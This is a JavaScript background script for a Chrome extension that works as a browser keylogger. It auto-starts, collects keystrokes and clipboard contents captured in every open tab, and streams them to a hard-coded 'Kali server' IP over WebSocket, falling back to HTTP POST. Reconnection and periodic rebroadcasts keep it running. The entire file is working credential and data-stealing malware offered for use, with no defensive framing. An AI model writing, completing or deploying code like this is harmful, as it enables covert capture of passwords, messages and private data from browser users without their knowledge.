let socket = null;
let monitoringActive = true; // Auto-start
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;

// Replace with your Kali server IP
const SERVER_URL = 'ws://192.168.0.196:3000';
const HTTP_FALLBACK_URL = 'http://192.168.0.196:3000/api/keystrokes';

// ============================================
// WebSocket connection management
// ============================================
function connectWebSocket() {
    try {
        socket = new WebSocket(SERVER_URL);
        socket.onopen = () => {
            console.log('✅ Connected to server');
            reconnectAttempts = 0;
            socket.send(JSON.stringify({ type: 'REGISTRATION', client: 'chrome-extension' }));
            broadcastStateToAllTabs(); // ensure all tabs know we're active
        };
        socket.onclose = () => {
            console.log('❌ Disconnected');
            if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                reconnectAttempts++;
                const delay = Math.min(1000 * reconnectAttempts, 30000);
                setTimeout(connectWebSocket, delay);
            }
        };
        socket.onerror = (err) => console.error('WebSocket error:', err);
    } catch (e) { console.error('Failed to connect:', e); }
}

async function sendViaHTTP(data) {
    try {
        await fetch(HTTP_FALLBACK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (e) { console.error('HTTP fallback failed:', e); }
}

// ============================================
// Broadcast monitoring state to all tabs
// ============================================
function broadcastStateToAllTabs() {
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(tab => {
            chrome.tabs.sendMessage(tab.id, {
                type: 'MONITORING_STATE',
                active: monitoringActive
            }).catch(() => {}); // ignore tabs without content script
        });
    });
}

// ============================================
// Listen for messages from content scripts
// ============================================
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // When a content script is ready, send it the current state
    if (message.type === 'CONTENT_SCRIPT_READY') {
        chrome.tabs.sendMessage(sender.tab.id, {
            type: 'MONITORING_STATE',
            active: monitoringActive
        }).catch(() => {});
        sendResponse({ received: true });
        return;
    }

    if (!monitoringActive) return;

    if (message.type === 'KEYSTROKE_CAPTURED') {
        const data = message.data;
        data.type = 'KEYSTROKE';
        if (socket?.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify(data));
        } else {
            sendViaHTTP(data);
        }
    }
    else if (message.type === 'CLIPBOARD_CAPTURED') {
        const data = message.data;
        data.type = 'CLIPBOARD';
        if (socket?.readyState === WebSocket.OPEN) {
            socket.send(JSON.stringify(data));
        } else {
            sendViaHTTP(data);
        }
    }
    else if (message.type === 'GET_STATUS') {
        sendResponse({
            active: monitoringActive,
            connected: socket?.readyState === WebSocket.OPEN
        });
    }
});

// ============================================
// When a tab finishes loading, send it the current state
// ============================================
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
        chrome.tabs.sendMessage(tabId, {
            type: 'MONITORING_STATE',
            active: monitoringActive
        }).catch(() => {});
    }
});

// ============================================
// Start the WebSocket connection
// ============================================
connectWebSocket();
chrome.runtime.onStartup?.addListener(connectWebSocket);

// Broadcast state periodically to catch any tabs that missed it
setInterval(broadcastStateToAllTabs, 10000);